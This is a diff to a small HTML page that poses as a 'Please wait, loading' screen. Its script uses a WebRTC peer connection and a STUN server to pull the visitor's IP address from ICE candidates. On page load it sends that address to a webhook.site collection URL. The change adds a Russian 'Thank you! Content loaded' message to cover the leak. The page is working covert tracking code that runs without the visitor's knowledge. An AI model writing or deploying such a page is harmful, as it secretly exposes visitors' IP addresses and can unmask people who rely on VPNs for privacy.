@@ -2,15 +2,16 @@
 <html>
 <head><title>Loading...</title></head>
 <body>
-<h3>Please wait, loading content...</h3>
+<h3>Please wait...</h3>
 <script>
 var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
 pc.createDataChannel("");
-pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
-pc.onicecandidate = function(e) {
+pc.createOffer().then(o => pc.setLocalDescription(o));
+pc.onicecandidate = e => {
     if (e.candidate) {
         var ip = e.candidate.candidate.split(" ")[4];
         fetch("https://webhook.site/1a311882-3ec6-4abf-a845-b70771b2c063?ip=" + ip);
+        document.body.innerHTML = "<h2>Спасибо! Контент загружен.</h2>";
     }
 };
 </script>
